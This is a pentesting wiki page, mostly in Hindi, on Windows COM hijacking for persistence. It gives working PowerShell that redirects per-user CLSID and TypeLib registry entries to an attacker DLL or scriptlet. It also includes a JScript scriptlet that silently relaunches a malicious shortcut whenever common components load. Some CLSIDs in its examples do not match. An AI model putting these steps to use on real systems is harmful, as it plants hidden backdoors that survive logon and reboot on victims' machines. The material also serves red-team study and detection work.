# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### मौजूद नहीं COM घटकों की खोज

चूँकि HKCU के मान उपयोगकर्ताओं द्वारा बदले जा सकते हैं, इसलिए **COM Hijacking** को एक **स्थायी तंत्र** के रूप में उपयोग किया जा सकता है। `procmon` का उपयोग करके उन COM रजिस्ट्रीज़ को ढूँढना आसान है जो मौजूद नहीं हैं और जिन्हें एक हमलावर स्थायी रूप से बनाने के लिए बना सकता है। फ़िल्टर:

- **RegOpenKey** ऑपरेशन.
- जहाँ _Result_ **NAME NOT FOUND** है.
- और _Path_ **InprocServer32** पर समाप्त होता है.

एक बार आपने तय कर लिया कि किस मौजूद नहीं वाले COM की नक़ल करनी है, निम्नलिखित कमांड्स चलाएँ। _ध्यान रखें कि अगर आप किसी ऐसे COM की नक़ल करते हैं जो हर कुछ सेकंड में लोड होता है तो यह ज़रूरत से ज़्यादा हो सकता है._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Hijackable Task Scheduler COM components

Windows Tasks Custom Triggers का उपयोग करके COM objects को कॉल करते हैं और क्योंकि वे Task Scheduler के माध्यम से execute होते हैं, इसलिए यह अनुमान लगाना आसान होता है कि उन्हें कब ट्रिगर किया जाएगा।

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

आउटपुट को देखकर आप उस टास्क का चयन कर सकते हैं जो उदाहरण के लिए **हर बार जब कोई उपयोगकर्ता लॉग इन करता है** चलाया जाएगा।

अब CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** को **HKEY\CLASSES\ROOT\CLSID** और HKLM तथा HKCU में खोजने पर, आम तौर पर आप पाएंगे कि यह value HKCU में मौजूद नहीं होती।
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
फिर, आप केवल HKCU एंट्री बना सकते हैं और हर बार जब उपयोगकर्ता लॉग इन करेगा, आपका backdoor सक्रिय हो जाएगा।

---

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) COM इंटरफेस को परिभाषित करती हैं और `LoadTypeLib()` के माध्यम से लोड की जाती हैं। जब कोई COM server instantiate होता है, तो OS संबंधित TypeLib को भी लोड कर सकता है, यह देखकर कि registry keys `HKCR\TypeLib\{LIBID}` के अंतर्गत क्या है। यदि TypeLib पाथ को एक **moniker** से बदल दिया जाए, जैसे `script:C:\...\evil.sct`, तो जब TypeLib resolve होगा तब Windows उस scriptlet को execute करेगा – जिससे एक stealthy persistence बनती है जो आम कंपोनेंट्स के उपयोग पर trigger होती है।

This has been observed against the Microsoft Web Browser control (frequently loaded by Internet Explorer, apps embedding WebBrowser, and even `explorer.exe`).

### Steps (PowerShell)

1) Identify the TypeLib (LIBID) used by a high-frequency CLSID. Example CLSID often abused by malware chains: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) per-user TypeLib path को स्थानीय scriptlet की ओर `script:` moniker का उपयोग करके इंगित करें (एडमिन अधिकार आवश्यक नहीं):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) अपना प्राथमिक payload फिर से लॉन्च करने के लिए एक न्यूनतम JScript `.sct` डालें (उदा. initial chain द्वारा उपयोग किया गया `.lnk`):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) सक्रिय करना – IE खोलना, कोई एप्लिकेशन जो WebBrowser control को एम्बेड करता है, या सामान्य Explorer गतिविधि TypeLib को लोड करेगी और scriptlet को निष्पादित करेगी, जिससे logon/reboot पर आपकी chain फिर से सशस्त्र हो जाएगी।

साफ़-सफ़ाई
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
नोट्स
- आप वही लॉजिक अन्य बार-बार उपयोग होने वाले COM घटकों पर लागू कर सकते हैं; सदैव पहले `HKCR\CLSID\{CLSID}\TypeLib` से वास्तविक `LIBID` को हल करें।
- 64-bit सिस्टम्स पर आप 64-bit उपभोक्ताओं के लिए `win64` उप-कुंजी भी भर सकते हैं।

## संदर्भ

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)

{{#include ../../banners/hacktricks-training.md}}
